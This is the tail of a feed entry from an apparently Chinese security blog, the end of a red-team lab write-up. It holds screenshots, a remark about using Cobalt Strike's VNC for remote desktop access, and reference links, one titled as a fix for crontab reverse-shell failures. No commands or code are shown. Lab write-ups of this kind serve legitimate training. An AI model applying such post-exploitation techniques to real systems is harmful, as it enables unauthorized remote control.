&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551462.png&#34; alt=&#34;image-20211114014338299&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;p&gt;或者免去以上步骤，直接 CS 的 VNC&lt;/p&gt;
&lt;p&gt;&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://m1n-1258939911.cos.ap-nanjing.myqcloud.com/BlogImages/Contents/202201041551829.png&#34; alt=&#34;image-20211114013338451&#34; class=&#34;lazyload&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;reference&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#reference&#34;&gt;#&lt;/a&gt; Reference&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;http://vulnstack.qiyuanxuetang.net/vuln/detail/6/&#34;&gt;http://vulnstack.qiyuanxuetang.net/vuln/detail/6/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.freebuf.com/articles/web/271892.html&#34;&gt;https://www.freebuf.com/articles/web/271892.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.dazhuanlan.com/oliiiflorrr/topics/1144804&#34;&gt;https://www.dazhuanlan.com/oliiiflorrr/topics/1144804&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/&#34;&gt;https://m3lon.github.io/2019/03/18 / 解决 ubuntu-crontab 反弹 shell 失败的问题 /&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&#34;&gt;https://www.cnblogs.com/zhangshengxiang/p/11842326.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;http://www.hackdig.com/09/hack-492089.htm&#34;&gt;http://www.hackdig.com/09/hack-492089.htm&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/zy15667076526/article/details/116059592&#34;&gt;https://blog.csdn.net/zy15667076526/article/details/116059592&lt;/a&gt;&lt;/p&gt;
</content>
        <updated>2021-11-16T14:22:21.000Z</updated>
    </entry>
</feed>
